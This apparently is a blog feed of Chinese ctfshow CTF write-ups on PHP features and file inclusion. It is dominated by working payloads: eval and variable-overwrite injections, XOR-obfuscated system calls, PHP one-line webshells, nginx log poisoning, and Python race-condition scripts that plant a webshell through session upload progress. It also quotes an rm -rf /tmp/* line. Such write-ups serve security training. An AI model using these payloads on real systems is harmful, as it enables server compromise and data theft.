&lt;h1 id=&#34;web-123&#34;&gt;&lt;a href=&#34;#web-123&#34; class=&#34;headerlink&#34; title=&#34;web 123&#34;&gt;&lt;/a&gt;web 123&lt;/h1&gt;&lt;p&gt;对于该题，看到需要&lt;code&gt;POST CT_SHOW&lt;/code&gt;和&lt;code&gt;CTF_SHOW.COM&lt;/code&gt;的值&lt;/p&gt;
&lt;p&gt;由于PHP变量只能由数字字母下划线，故如果直接上传&lt;code&gt;CTF_SHOW.COM&lt;/code&gt;后，&lt;code&gt;.&lt;/code&gt;会自动转换成下划线，上传的实际上是&lt;code&gt;CTF_SHOW_COM&lt;/code&gt;的变量&lt;/p&gt;
&lt;p&gt;而为了防止对后面的点进行转换，可以将&lt;code&gt;CTF&lt;/code&gt;后的下划线改为左方括号，这样，只会将该括号改为下划线，而后面的点不受影响，但是如果将其换为&lt;code&gt;.&lt;/code&gt;或&lt;code&gt;+&lt;/code&gt;，两个符号均会变成下划线&lt;/p&gt;
&lt;p&gt;再看代码，之后会进行&lt;code&gt;eval&lt;/code&gt;函数， &lt;code&gt;$c&lt;/code&gt; 为POST传入的&lt;code&gt;$fun&lt;/code&gt;值&lt;/p&gt;
&lt;h2 id=&#34;解法一-2&#34;&gt;&lt;a href=&#34;#解法一-2&#34; class=&#34;headerlink&#34; title=&#34;解法一&#34;&gt;&lt;/a&gt;解法一&lt;/h2&gt;&lt;p&gt;传入命令&lt;code&gt;extract($_POST)&lt;/code&gt;将变量转为POST类型，然后通过POST传入&lt;code&gt;fl0g=flag_give_me&lt;/code&gt;绕过对GET变量的判断，并且满足第二个判断条件&lt;/p&gt;
&lt;p&gt;payload: &lt;code&gt;CTF_SHOW=1&amp;amp;CTF[SHOW.COM=2&amp;amp;fun=extract($_POST)&amp;amp;fl0g=flag_give_me&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;解法二-2&#34;&gt;&lt;a href=&#34;#解法二-2&#34; class=&#34;headerlink&#34; title=&#34;解法二&#34;&gt;&lt;/a&gt;解法二&lt;/h2&gt;&lt;p&gt;&lt;code&gt;get_defined_vars&lt;/code&gt; —— 返回由所有已定义变量所组成的数组&lt;/p&gt;
&lt;p&gt;由于返回的是数组，&lt;code&gt;echo&lt;/code&gt;输出数组只能输出&lt;code&gt;Array&lt;/code&gt;，因此需要一个输出数组的函数或者将数组转换为字符串&lt;/p&gt;
&lt;p&gt;但输出数组的函数&lt;code&gt;var_dump()&lt;/code&gt;,&lt;code&gt;print_r()&lt;/code&gt;被禁用，故尝试使数组转换为字符串&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;implode&lt;/p&gt;
&lt;p&gt;implode —— 将一个一维数组的值转化为字符串&lt;/p&gt;
&lt;p&gt;payload:&lt;code&gt;CTF_SHOW=1&amp;amp;CTF[SHOW.COM=2&amp;amp;fun=echo implode(get_defined_vars())&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;解法三&#34;&gt;&lt;a href=&#34;#解法三&#34; class=&#34;headerlink&#34; title=&#34;解法三&#34;&gt;&lt;/a&gt;解法三&lt;/h2&gt;&lt;p&gt;利用&lt;code&gt;argv&lt;/code&gt;数组&lt;/p&gt;
&lt;p&gt;数组中，用空格来进行值的分别&lt;/p&gt;
&lt;p&gt;GET:&lt;code&gt;?a=1+fl0g=flag_give_me&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;POST:&lt;code&gt;CTF_SHOW=&amp;amp;CTF[SHOW.COM=&amp;amp;fun=parse_str($a[1])&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;解法四&#34;&gt;&lt;a href=&#34;#解法四&#34; class=&#34;headerlink&#34; title=&#34;解法四&#34;&gt;&lt;/a&gt;解法四&lt;/h2&gt;&lt;p&gt;GET:&lt;code&gt;1=flag.php&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;POST:&lt;code&gt;CTF_SHOW=&amp;amp;CTF[SHOW.COM=&amp;amp;fun=highlight_file($_GET[1])&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;解法五&#34;&gt;&lt;a href=&#34;#解法五&#34; class=&#34;headerlink&#34; title=&#34;解法五&#34;&gt;&lt;/a&gt;解法五&lt;/h2&gt;&lt;p&gt;&lt;code&gt;var_dump($GLOBALS)&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;web-125&#34;&gt;&lt;a href=&#34;#web-125&#34; class=&#34;headerlink&#34; title=&#34;web 125&#34;&gt;&lt;/a&gt;web 125&lt;/h1&gt;&lt;p&gt;过滤了&lt;code&gt;flag|GLOBALS|echo|var_dump|print&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;仍可使用上面的法1、法3、法4&lt;/p&gt;
&lt;h1 id=&#34;web-126&#34;&gt;&lt;a href=&#34;#web-126&#34; class=&#34;headerlink&#34; title=&#34;web 126&#34;&gt;&lt;/a&gt;web 126&lt;/h1&gt;&lt;p&gt;使用法三&lt;/p&gt;
&lt;h1 id=&#34;web-127&#34;&gt;&lt;a href=&#34;#web-127&#34; class=&#34;headerlink&#34; title=&#34;web 127&#34;&gt;&lt;/a&gt;web 127&lt;/h1&gt;&lt;p&gt;用空格绕过 &lt;code&gt;_&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;?ctf show=ilove36d&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$_SERVER [QUERY_STRING]&lt;/code&gt;，经过验证，不能显示post传参的内容，故只能采取get传参&lt;/p&gt;
&lt;h1 id=&#34;web-128&#34;&gt;&lt;a href=&#34;#web-128&#34; class=&#34;headerlink&#34; title=&#34;web 128&#34;&gt;&lt;/a&gt;web 128&lt;/h1&gt;&lt;p&gt;主要使用&lt;code&gt;gettext&lt;/code&gt;函数&lt;/p&gt;
&lt;p&gt;获取当前信息，可以获取到参数中的值，而它又可以使用&lt;code&gt;_&lt;/code&gt;代替该函数&lt;/p&gt;
&lt;p&gt;所以 payload:&lt;code&gt;?f1=_&amp;amp;f2=get_defined_vars&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;web-129&#34;&gt;&lt;a href=&#34;#web-129&#34; class=&#34;headerlink&#34; title=&#34;web 129&#34;&gt;&lt;/a&gt;web 129&lt;/h1&gt;&lt;p&gt;目录穿越&lt;/p&gt;
&lt;p&gt;&lt;code&gt;../ctfshow/../html/flag.php&lt;/code&gt; （或其他)&lt;/p&gt;
&lt;h1 id=&#34;web-130&#34;&gt;&lt;a href=&#34;#web-130&#34; class=&#34;headerlink&#34; title=&#34;web 130&#34;&gt;&lt;/a&gt;web 130&lt;/h1&gt;&lt;p&gt;&lt;code&gt;f=ctfshow&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;或数组绕过&lt;/p&gt;
&lt;p&gt;&lt;code&gt;f[]=1&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;web-131&#34;&gt;&lt;a href=&#34;#web-131&#34; class=&#34;headerlink&#34; title=&#34;web 131&#34;&gt;&lt;/a&gt;web 131&lt;/h1&gt;&lt;p&gt;&lt;code&gt;$a = str_repeat(&#34;show&#34;,250000); $b = $a . &#34;36Dctfshow&#34;; echo $b;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;长度限制，绕过正则&lt;/p&gt;
&lt;h1 id=&#34;web-132&#34;&gt;&lt;a href=&#34;#web-132&#34; class=&#34;headerlink&#34; title=&#34;web 132&#34;&gt;&lt;/a&gt;web 132&lt;/h1&gt;&lt;p&gt;逻辑运算符的优先级判断&lt;/p&gt;
&lt;p&gt;payload:&lt;code&gt;?username=admin&amp;amp;password=1&amp;amp;code=adm3in&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;web-133&#34;&gt;&lt;a href=&#34;#web-133&#34; class=&#34;headerlink&#34; title=&#34;web 133&#34;&gt;&lt;/a&gt;web 133&lt;/h1&gt;&lt;h2 id=&#34;curl-外带&#34;&gt;&lt;a href=&#34;#curl-外带&#34; class=&#34;headerlink&#34; title=&#34;curl 外带&#34;&gt;&lt;/a&gt;curl 外带&lt;/h2&gt;&lt;p&gt;curl&lt;/p&gt;
&lt;h2 id=&#34;Linux-中的-cp-命令&#34;&gt;&lt;a href=&#34;#Linux-中的-cp-命令&#34; class=&#34;headerlink&#34; title=&#34;Linux 中的 cp 命令&#34;&gt;&lt;/a&gt;Linux 中的 cp 命令&lt;/h2&gt;&lt;p&gt;利用&lt;code&gt;cp&lt;/code&gt;命令将flag.php写入1.txt，然后访问1.txt&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;raw&#34;&gt;payload：
?F=`$F` ;cp flag.php 1234.txt
/1234.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;注意是反引号，相当于shell_exec()函数&lt;/p&gt;
&lt;p&gt;成功原因&lt;/p&gt;
&lt;p&gt;虽然&lt;code&gt;substr&lt;/code&gt;只取前六位，但在该payload中，由于前六位是&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;raw&#34;&gt;`$F` ;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;读入后变量的值会放进去变成&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;raw&#34;&gt;``$F` ;cp flag.php 1234.txt`
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;PING&#34;&gt;&lt;a href=&#34;#PING&#34; class=&#34;headerlink&#34; title=&#34;PING&#34;&gt;&lt;/a&gt;PING&lt;/h2&gt;&lt;h1 id=&#34;web-134&#34;&gt;&lt;a href=&#34;#web-134&#34; class=&#34;headerlink&#34; title=&#34;web 134&#34;&gt;&lt;/a&gt;web 134&lt;/h1&gt;&lt;p&gt;观察代码&lt;/p&gt;
&lt;p&gt;&lt;code&gt;parse_str&lt;/code&gt; — 将字符串解析成多个变量&lt;/p&gt;
&lt;p&gt;&lt;code&gt;extract&lt;/code&gt; — 从数组中将变量导入到当前的符号表 (如果变量已存在，将会覆盖变量)&lt;/p&gt;
&lt;p&gt;由于不能在POST里直接传&lt;code&gt;key1&lt;/code&gt;和&lt;code&gt;key2&lt;/code&gt;的值，所以可以通过GET方式，传入变量名为&lt;code&gt;_POST&lt;/code&gt;的变量，使得其在之后的&lt;code&gt;extract&lt;/code&gt;能够覆盖原理啊的&lt;code&gt;key1&lt;/code&gt;和&lt;code&gt;key2&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;payload:&lt;code&gt;?_POST[key1]=36d&amp;amp;_POST[key2]=36d&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;web-135&#34;&gt;&lt;a href=&#34;#web-135&#34; class=&#34;headerlink&#34; title=&#34;web 135&#34;&gt;&lt;/a&gt;web 135&lt;/h1&gt;&lt;h2 id=&#34;cp-命令&#34;&gt;&lt;a href=&#34;#cp-命令&#34; class=&#34;headerlink&#34; title=&#34;cp 命令&#34;&gt;&lt;/a&gt;cp 命令&lt;/h2&gt;&lt;h2 id=&#34;ping&#34;&gt;&lt;a href=&#34;#ping&#34; class=&#34;headerlink&#34; title=&#34;ping&#34;&gt;&lt;/a&gt;ping&lt;/h2&gt;&lt;h2 id=&#34;web-136&#34;&gt;&lt;a href=&#34;#web-136&#34; class=&#34;headerlink&#34; title=&#34;web 136&#34;&gt;&lt;/a&gt;web 136&lt;/h2&gt;&lt;h2 id=&#34;tee-命令&#34;&gt;&lt;a href=&#34;#tee-命令&#34; class=&#34;headerlink&#34; title=&#34;tee 命令&#34;&gt;&lt;/a&gt;tee 命令&lt;/h2&gt;&lt;p&gt;&lt;code&gt;?c=ls /|tee 1&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;将&lt;code&gt;ls /&lt;/code&gt;的回显写入1文件&lt;/p&gt;
&lt;p&gt;使用nl命令&lt;/p&gt;
&lt;p&gt;之后可以使用同样命令，然后返回即可&lt;/p&gt;
&lt;h2 id=&#34;修改文件内容&#34;&gt;&lt;a href=&#34;#修改文件内容&#34; class=&#34;headerlink&#34; title=&#34;修改文件内容&#34;&gt;&lt;/a&gt;修改文件内容&lt;/h2&gt;&lt;p&gt;&lt;code&gt;?c=ls |xargs sed -i &#39;s/exec/echo/&#39;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;?c=ls |xargs sed -i &#39;s/exec/system/&#39;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;重新访问题目，可以发现字符串匹配下&lt;code&gt;die&lt;/code&gt;变为&lt;code&gt;echo&lt;/code&gt;，也就是说，即使满足正则匹配，代码不会结束，会执行后面的代码&lt;/p&gt;
&lt;p&gt;无回显的&lt;code&gt;exec&lt;/code&gt;变为了&lt;code&gt;system&lt;/code&gt;，可以输入命令并回显&lt;/p&gt;
&lt;h1 id=&#34;web-137&#34;&gt;&lt;a href=&#34;#web-137&#34; class=&#34;headerlink&#34; title=&#34;web 137&#34;&gt;&lt;/a&gt;web 137&lt;/h1&gt;&lt;p&gt;类静态方法的访问&lt;/p&gt;
&lt;p&gt;POST: &lt;code&gt;ctfshow=ctfshow::getFLag&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;web-138&#34;&gt;&lt;a href=&#34;#web-138&#34; class=&#34;headerlink&#34; title=&#34;web 138&#34;&gt;&lt;/a&gt;web 138&lt;/h1&gt;&lt;p&gt;ban掉了冒号&lt;/p&gt;
&lt;p&gt;查看文档，找寻访问静态方法的另一种手段&lt;/p&gt;
&lt;p&gt;&lt;code&gt;call_user_func&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/../../../../post_images/%E5%9B%BE%E7%89%87/static_visit.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;也就是说可以通过给&lt;code&gt;call_user_func&lt;/code&gt;传入一个数组，使其访问&lt;/p&gt;
&lt;p&gt;所以payload:&lt;code&gt;ctfshow[]=ctfshow&amp;amp;ctfshow[]=getFlag&lt;/code&gt;（该语句意义为给 ctfshow [] 赋两个值）&lt;/p&gt;
&lt;h1 id=&#34;web-139&#34;&gt;&lt;a href=&#34;#web-139&#34; class=&#34;headerlink&#34; title=&#34;web 139&#34;&gt;&lt;/a&gt;web 139&lt;/h1&gt;&lt;p&gt;经过测试，如果想要&lt;code&gt;intval($code) == &#39;ctfshow&#39;&lt;/code&gt;为 true&lt;/p&gt;
&lt;p&gt;那么&lt;code&gt;code&lt;/code&gt;也应该为字符串&lt;/p&gt;
&lt;p&gt;而&lt;code&gt;$code = eval(&#34;return $f1($f2());&#34;);&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;所以必须要使函数返回字符串，&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;f1=system&amp;amp;f2=getcwd
f1=system&amp;amp;f2=system
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;web-141&#34;&gt;&lt;a href=&#34;#web-141&#34; class=&#34;headerlink&#34; title=&#34;web 141&#34;&gt;&lt;/a&gt;web 141&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;if (is_numeric($v1) &amp;amp;&amp;amp; is_numeric($v2)) {
        if (preg_match(&#39;/^\W+$/&#39;, $v3)) {
            $code =  eval(&#34;return $v1$v3$v2;&#34;);
            echo &#34;$v1$v3$v2 = &#34; . $code;
        }
    }
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;由判断及正则匹配，知v1，v2为数字，v3为非字母&lt;/p&gt;
&lt;p&gt;测试&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;$test = $_GET[&#39;test&#39;];
eval(&#34;$test;&#34;);
?test=phpinfo()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;phpinfo()&lt;/code&gt; 被成功执行，也就是说该写法成立 (相当于以前的`eval ($c));?c=phpinfo())&lt;/p&gt;
&lt;p&gt;在上面的语句中，分号已写不用自己补，因此会执行该代码&lt;/p&gt;
&lt;p&gt;而由于题目执行的代码是&lt;code&gt;$v1$v3$v2&lt;/code&gt;,&lt;code&gt;v1&lt;/code&gt;，&lt;code&gt;v2&lt;/code&gt;必为数字，所以可控的字符只有&lt;code&gt;v3&lt;/code&gt;，并要将其于前后分开&lt;/p&gt;
&lt;p&gt;进行测试&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;1-phpinfo()-1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;可以执行，所以可以传入&lt;code&gt;?v1=1&amp;amp;v2=1&amp;amp;v3=&lt;/code&gt;命令进行&lt;/p&gt;
&lt;p&gt;但又因&lt;code&gt;3&lt;/code&gt;不能出现字母，而大多数函数都有字母，这里采用&lt;code&gt;16&lt;/code&gt;进制构造的方法构造出命令&lt;/p&gt;
&lt;p&gt;例如&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;//system(&#39;ls&#39;)
?v1=1&amp;amp;v2=1&amp;amp;v3=-(%80%80%80%80%80%80^%f3%f9%f3%f4%e5%ed)(%80%80^%ec%f3)-   
//system(&#39;tac flag.php&#39;)
?v1=1&amp;amp;v2=1&amp;amp;v3=-(%80%80%80%80%80%80^%f3%f9%f3%f4%e5%ed)(%80%80%80%80%80%80%80%80%80%80%80%80^%f4%e1%e3%a0%e6%ec%e1%e7%ae%f0%e8%f0)-
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;web-142&#34;&gt;&lt;a href=&#34;#web-142&#34; class=&#34;headerlink&#34; title=&#34;web 142&#34;&gt;&lt;/a&gt;web 142&lt;/h1&gt;&lt;p&gt;输入小于等于0的数字即可&lt;/p&gt;
&lt;h1 id=&#34;web-143&#34;&gt;&lt;a href=&#34;#web-143&#34; class=&#34;headerlink&#34; title=&#34;web 143&#34;&gt;&lt;/a&gt;web 143&lt;/h1&gt;&lt;p&gt;同141，把减号换成乘号&lt;/p&gt;
&lt;h1 id=&#34;web-144&#34;&gt;&lt;a href=&#34;#web-144&#34; class=&#34;headerlink&#34; title=&#34;web 144&#34;&gt;&lt;/a&gt;web 144&lt;/h1&gt;&lt;p&gt;原理同141, 调整一下v2，v3&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?v1=1&amp;amp;v2=(%80%80%80%80%80%80^%f3%f9%f3%f4%e5%ed)(%80%80%80%80%80%80%80%80%80%80%80%80^%f4%e1%e3%a0%e6%ec%e1%e7%ae%f0%e8%f0)&amp;amp;v3=-
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;web-145&#34;&gt;&lt;a href=&#34;#web-145&#34; class=&#34;headerlink&#34; title=&#34;web 145&#34;&gt;&lt;/a&gt;web 145&lt;/h1&gt;&lt;p&gt;相同原理&lt;/p&gt;
&lt;p&gt;这里使用取反运算 (或运算不能用，应为如果要用或，那么值一定在0-128内，而此时因为绝大部分可用字符被禁，也就是说此时不能构造出满足条件的)&lt;/p&gt;
&lt;p&gt;并使用三元条目运算符 &lt;code&gt;?ex1:ex2&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;?v1=1&amp;amp;v2=1&amp;amp;v3=?(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%D5):&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;或者用没有过滤的或运算&lt;/p&gt;
&lt;p&gt;&lt;code&gt;?v1=1&amp;amp;v2=1&amp;amp;v3=|(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%D5)|&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;web-146&#34;&gt;&lt;a href=&#34;#web-146&#34; class=&#34;headerlink&#34; title=&#34;web 146&#34;&gt;&lt;/a&gt;web 146&lt;/h1&gt;&lt;p&gt;同145第二种解法&lt;/p&gt;
&lt;h1 id=&#34;web-147&#34;&gt;&lt;a href=&#34;#web-147&#34; class=&#34;headerlink&#34; title=&#34;web 147&#34;&gt;&lt;/a&gt;web 147&lt;/h1&gt;&lt;p&gt;&lt;code&gt;if (!preg_match(&#39;/^[a-z0-9_]*$/isD&#39;, $ctfshow))&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;不能有数字字母开头&lt;/p&gt;
&lt;p&gt;利用命名空间&lt;code&gt;\函数名&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;首先使用&lt;code&gt;\phpinfo&lt;/code&gt;, 发现提示用了2个函数&lt;/p&gt;
&lt;p&gt;这里可以采用匿名函数，然后传入&lt;code&gt;show&lt;/code&gt;使其闭合&lt;code&gt;if&lt;/code&gt;判断，最后注释后面的语句&lt;/p&gt;
&lt;p&gt;payload:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?show=}system(&#39;tac flag.php&#39;);/*
ctf=\create_function
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;web-148&#34;&gt;&lt;a href=&#34;#web-148&#34; class=&#34;headerlink&#34; title=&#34;web 148&#34;&gt;&lt;/a&gt;web 148&lt;/h1&gt;&lt;p&gt;同 141&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;或者&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;调用函数方法&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;get_ctfshow_fl0g()
?code = (%80%80%80%80%80%80%80%80%80%80%80%80%80%80%80%80^%e7%e5%f4%df%e3%f4%e6%f3%e8%ef%f7%df%e6%ec%b0%e7)();
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;web-149&#34;&gt;&lt;a href=&#34;#web-149&#34; class=&#34;headerlink&#34; title=&#34;web 149&#34;&gt;&lt;/a&gt;web 149&lt;/h1&gt;&lt;p&gt;覆盖index.php&lt;/p&gt;
&lt;p&gt;payload：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?ctf=index.php 
POST:show=&amp;lt;?php eval($_POST[1]);?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;web-150&#34;&gt;&lt;a href=&#34;#web-150&#34; class=&#34;headerlink&#34; title=&#34;web 150&#34;&gt;&lt;/a&gt;web 150&lt;/h1&gt;&lt;p&gt;日志包含&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php eval($_REQUEST[1]);?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;然后利用ctf传参，传入日志的路径，使日志被访问&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;raw&#34;&gt;ctf=/var/log/nginx/access.log
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;设置isVIP的值为1，使最下面的if条件成立&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;raw&#34;&gt;?isVIP=1
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;web-150-plus&#34;&gt;&lt;a href=&#34;#web-150-plus&#34; class=&#34;headerlink&#34; title=&#34;web 150-plus&#34;&gt;&lt;/a&gt;web 150-plus&lt;/h1&gt;&lt;p&gt;&lt;code&gt;__autoload()&lt;/code&gt;&lt;br&gt;当第一次使用一个类 A 时，如果找不到，会自动调用&lt;code&gt;__autoload()&lt;/code&gt;方法，并将类名&lt;code&gt;A&lt;/code&gt;作为参数传入，我们在&lt;code&gt;__autoload()&lt;/code&gt;中需要的做的就是根据类名，找到相应的文件，并包含进来。&lt;/p&gt;
&lt;p&gt;本题中&lt;code&gt;class_exists()&lt;/code&gt;类是第一次使用，可以通过对它的使用来调用 &lt;code&gt;autoload ()&lt;/code&gt;这个魔术方法输出变量&lt;code&gt;$class&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;过滤掉了&lt;code&gt;_&lt;/code&gt;，可以通过&lt;code&gt;…&lt;/code&gt;绕过&lt;/p&gt;
&lt;p&gt;因为题中有&lt;code&gt;extract&lt;/code&gt;函数，会将传入的数组解析掉，所以get传入：&lt;code&gt;?..CTFSHOW…=phpinfo&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;phpinfo()&lt;/code&gt; 里面有flag&lt;/p&gt;
&lt;p&gt;预期解：&lt;strong&gt;条件竞争&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ctf=1.php&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;show=&amp;lt;?php system(&#39;tac /c*&#39;);?&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;使用bp不断访问并传参，然后开一个去不断访问1.php&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://dpm12345.cn/posts/31915a1e/</guid>
            <title>文件包含</title>
            <link>http://dpm12345.cn/posts/31915a1e/</link>
            <category>CTF</category>
            <category>ctfshow</category>
            <pubDate>Tue, 04 Oct 2022 22:12:40 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;web-78&#34;&gt;&lt;a href=&#34;#web-78&#34; class=&#34;headerlink&#34; title=&#34;web 78&#34;&gt;&lt;/a&gt;web 78&lt;/h1&gt;&lt;p&gt;php 伪协议&lt;/p&gt;
&lt;h1 id=&#34;web-79&#34;&gt;&lt;a href=&#34;#web-79&#34; class=&#34;headerlink&#34; title=&#34;web 79&#34;&gt;&lt;/a&gt;web 79&lt;/h1&gt;&lt;p&gt;data伪协议&lt;code&gt;data://text/plain,&amp;lt;?=eval($_POST[1]);?&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;web-80&#34;&gt;&lt;a href=&#34;#web-80&#34; class=&#34;headerlink&#34; title=&#34;web 80&#34;&gt;&lt;/a&gt;web 80&lt;/h1&gt;&lt;p&gt;data 协议被禁用&lt;/p&gt;
&lt;p&gt;可以尝试日志包含&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;?php eval($_POST[1]);?&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;web-82&#34;&gt;&lt;a href=&#34;#web-82&#34; class=&#34;headerlink&#34; title=&#34;web 82&#34;&gt;&lt;/a&gt;web 82&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;#coding=utf-8
import io
import requests
import threading
sessid = &#39;TGAO&#39;          #sessionid 值，也为控制的文件名
data = {&#34;cmd&#34;:&#34;system(&#39;whoami&#39;);&#34;}         #进行的命令

# 写文件
def write(session):
    while True:
        f = io.BytesIO(b&#39;a&#39; * 1024 * 50)      #写入的文件内容
        resp = session.post( &#39;http://127.0.0.1:5555/test56.php&#39;, data={&#39;PHP_SESSION_UPLOAD_PROGRESS&#39;: &#39;&amp;lt;?php eval($_POST[&#34;cmd&#34;]);?&amp;gt;&#39;}, files={&#39;file&#39;: (&#39;tgao.txt&#39;,f)}, cookies={&#39;PHPSESSID&#39;: sessid} )
        #&#39;PHP_SESSION_UPLOAD_PROGRESS&#39;: &#39;&amp;lt;?php eval ($_POST [&#34;cmd&#34;]);?&amp;gt;&#39; 为一句话木马
        # files={&#39;file&#39;: (&#39;tgao.txt&#39;,f)} 为上传的文件
        # cookies={&#39;PHPSESSID&#39;: sessid}，设置 sessid，控制文件名
        
# 读文件
def read(session):
    while True:
        resp = session.post(&#39;http://127.0.0.1:5555/test56.php?file=session/sess_&#39;+sessid,data=data)
        if &#39;tgao.txt&#39; in resp.text:
            print(resp.text)
            event.clear()
        else:
            print(&#34;[+++++++++++++]retry&#34;)
if __name__==&#34;__main__&#34;:
    event=threading.Event()
    with requests.session() as session:
        for i in xrange(1,30): 
            threading.Thread(target=write,args=(session,)).start()
        for i in xrange(1,30):
            threading.Thread(target=read,args=(session,)).start()
    event.set()
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;import requests
import io
import threading
url = &#39; http://4c773cea-91fa-498e-8027-46bab5889b16.challenge.ctf.show:8080/&#39;
sessionid = &#39;ctfshow&#39;
data = {
    &#34;1&#34;: &#34;file_put_contents( &#39;/var/www/html/2.php&#39;,&#39;&amp;lt;?php eval($_ POST[2]);?&amp;gt;&#39;);&#34;
}


def write(session):
    fileBytes = io.BytesI0(b&#39; a&#39;*1024*50)
    while True:
        response = session.post(url,
                                data={
                                    &#39; PHP_SESSION_UPLOAD_PROGRESS&#39;: &#39;&amp;lt;?php eval($_ POST[1]);?&amp;gt;&#39;
                                },
                                cookies={
                                    &#39; PHPSESSID&#39;: sessionid
                                },
                                files={
                                    &#39;file&#39;: (&#39;ctfshow.jpg &#39;, fileBytes)
                                }
                                )


def read(session):
    while True:
        response = session.post(url + &#39;?file=/tmp/sess_&#39; + sessionid, data=data,
                                cookies={
                                    &#39;PHPSESSID&#39;: sessionid
                                }
                                )
        resposne2 = session.get(url + &#39;2.php &#39;)
        if resposne2.status_code == 200:
            print(&#39;++++++done++++++&#39;)
        else:
            print(resposne2.status_code)


if __name__ == &#39;__main__&#39;:
    evnet = threading . Event()
    with requests.session() as session:
        for i in range(5):
            threading. Thread(target=write, args=(session,)).start()
        for i in range(5):
            threading. Thread(target=read, args=(session,)) .start()
evnet. set()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;web-83-x2F-84&#34;&gt;&lt;a href=&#34;#web-83-x2F-84&#34; class=&#34;headerlink&#34; title=&#34;web 83 /84&#34;&gt;&lt;/a&gt;web 83 /84&lt;/h1&gt;&lt;p&gt;83使用了&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;session_unset();
session_destroy;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;84使用了&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;system(&#34;rm -rf /tmp/*&#34;);
&lt;/code&gt;&lt;/pre&gt;
